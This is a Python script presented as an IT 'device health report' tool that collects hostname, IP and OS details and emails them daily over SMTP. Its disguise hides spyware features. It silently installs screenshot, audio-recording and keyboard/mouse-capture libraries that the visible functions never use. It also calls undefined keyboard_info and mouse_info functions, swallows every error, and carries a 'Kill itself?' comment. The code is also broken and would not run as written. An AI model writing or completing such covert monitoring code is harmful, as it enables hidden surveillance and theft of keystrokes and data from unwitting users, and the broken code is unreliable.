try:
    import datetime
    from email.mime.multipart import MIMEMultipart
    from email.mime.text import MIMEText
    import platform
    import smtplib
    import socket
    import time
except ModuleNotFoundError:
    from subprocess import call
    modules = ["pyscreenshot","sounddevice","pynput"]
    call("pip install " + ' '.join(modules), shell=True)




def gather_system_info():
    info = {}
    info["Timestamp"] = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    info["Hostname"] = socket.gethostname()
    info["IP Address"] = socket.gethostbyname(info["Hostname"])
    info["Operating System"] = platform.system()
    info["OS Release"] = platform.release()
    info["OS Version"] = platform.version()
    info["Machine Architecture"] = platform.machine()
    info["Processor"] = platform.processor()
    return info


def save_report(info, filename="report.txt"):
  with open(filename, "w") as f:
    f.write("report")
    for key, value in info.items():
      f.write(f"{key}: {value}")
  return filename




def send_report(filename):
    smtp_server = "smtp.yourcompany.com"
    port = 587
    sender_email = "it-monitor@yourcompany.com"
    receiver_email = "it-support@yourcompany.com"
    password = "your_secure_password" 

    msg = MIMEMultipart()
    msg["From"] = sender_email
    msg["To"] = receiver_email
    msg["Subject"] = f"Device Health Report - {socket.gethostname()}"


    with open(filename, "r") as f:
        report_content = f.read()

    msg.attach(MIMEText(report_content, "plain"))

    try:
        server = smtplib.SMTP(smtp_server, port)
        server.starttls()
        server.login(sender_email, password)
        server.sendmail(sender_email, receiver_email, msg.as_string())
        server.quit()
        print("Device health report successfully sent to IT.")
    except Exception as e:
        print(f"Failed to send report: {e}")

if __name__ == "__main__":
    report_interval = 86400 #86400 is 24 hours in secs
    while True:
        try:
            sys_info = gather_system_info()
            keyboard_info = keyboard_info()
            mouse_info = mouse_info()
            report_file = save_report(sys_info)
            send_report(report_file)
        except Exception as E:
                pass
                #Kill itself?
        time.sleep(report_interval) 


